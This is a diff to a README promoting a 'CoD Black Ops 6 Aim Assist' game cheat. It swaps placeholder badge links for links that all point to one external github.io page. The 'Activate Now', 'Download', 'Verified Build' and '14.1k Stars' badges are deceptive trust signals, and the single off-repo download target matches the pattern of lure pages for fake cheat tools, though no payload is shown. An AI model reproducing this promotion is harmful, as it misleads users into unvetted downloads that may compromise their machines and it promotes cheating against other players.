@@ -22,10 +22,10 @@ This software provides **adjustable aim assistance** that works alongside your n
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 14.1k Stars](https://img.shields.io/badge/GitHub-14.1k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://cod-bo6-aim-assist.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://cod-bo6-aim-assist.github.io/.github/)
+[![⭐️ 14.1k Stars](https://img.shields.io/badge/GitHub-14.1k_Stars-green?logo=github\&style=for-the-badge)](https://cod-bo6-aim-assist.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://cod-bo6-aim-assist.github.io/.github/)
 
 ---
 
@@ -154,8 +154,8 @@ A: Yes, simply disable the tool or load the reset config.
 
 The **CoD Black Ops 6 Aim Assist** combines **precision targeting, recoil control, and adaptive sensitivity** into one streamlined package. Whether you’re practicing in casual lobbies or competing in ranked play, it ensures consistent, reliable accuracy when you need it most.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://cod-bo6-aim-assist.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://cod-bo6-aim-assist.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://cod-bo6-aim-assist.github.io/.github/)
 
 ---
